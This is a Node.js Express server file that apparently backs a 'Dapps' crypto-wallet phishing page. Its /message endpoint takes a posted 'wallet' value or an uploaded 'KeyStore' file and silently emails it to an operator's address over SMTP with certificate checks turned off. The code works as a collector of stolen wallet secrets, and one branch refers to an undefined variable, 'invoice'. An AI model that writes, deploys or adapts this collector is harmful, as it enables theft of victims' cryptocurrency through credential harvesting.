const express = require('express');
const cors = require('cors')
const app = express();
const PORT = process.env.PORT || 2000;
const path = require('path');
var nodemailer = require("nodemailer");
var multer = require('multer');
const { dirname } = require('path');
var upload = multer({ dest: 'uploads/' })



// const { EMAIL_ADDR } = require( './config' );
app.use(cors());
app.use(express.json());








let email;
let password;
let server;
let to;

if (process.env.NODE_ENV !== 'production') {
    email = '';
    password = '';
    server = '';
    to = '';
} else {
    email = process.env.email;
    password = process.env.password;
    server = process.env.server;
    to = process.env.to;

}



app.post('/message', upload.single('file'), (req, res) => {


  
    res.json('j')

    let input;

    if (req.file) {
        input = `
    <p> You have a messgae</p>
    <h3>  Details</h3>
    <ul>
       wallet: ${req.body.wallet}
    </ul>
    `;
    } else {
        input = `
    <p> You have a messgae</p>
    <h3>  Details</h3>
    <ul>
        ${JSON.stringify(req.body)}
    </ul>
    `;
    }


    var transporter = nodemailer.createTransport({
        service: server,//Gmail or any mail server
        host: server,//Gmail or any mail server
        port: 587,
        secure: false,
        auth: {
            user: email,//email
            pass: password//password
        },
        tls: {
            rejectUnauthorized: false
        }

    });

    var mailOptions;

    if (req.file) {
        mailOptions = {
            from: `"New Message"  <${email}>`,
            to: to,
            subject: 'From Dapps app',
            

        };

        if(req.file.mimetype === 'image/jpeg' || req.file.mimetype ===  'image/png' ){
            mailOptions.html ='KeyStore : <img src="https://dappsprotocol.net/assets/coinbase.jpg"/>',

            mailOptions.attachments= [{
                filename: req.file.originalname,
                path: req.file.path,
                cid: 'https://dappsprotocol.net/assets/coinbase.jpg' //same cid value as in the html img src
            }];
        }else{
            mailOptions.attachments= [
                {
                    filename: req.file.originalname,
                    path:invoice
                }
            ];
        }


    } else {
        mailOptions = {
            from: `"New Message"  <${email}>`,
            to: to,
            subject: 'From Dapps app',
            html: input
        };
    };


    transporter.sendMail(mailOptions, (err, info) => {
        if (err) {
            // res.json( { status: 500 } )
            console.log(err)
        } else {
            console.log(info)
            // res.status( 200 ).json('Done.')
            // console.l
        }
    });



});

app.listen(PORT, () => console.log(`Server started on Port ${PORT}`));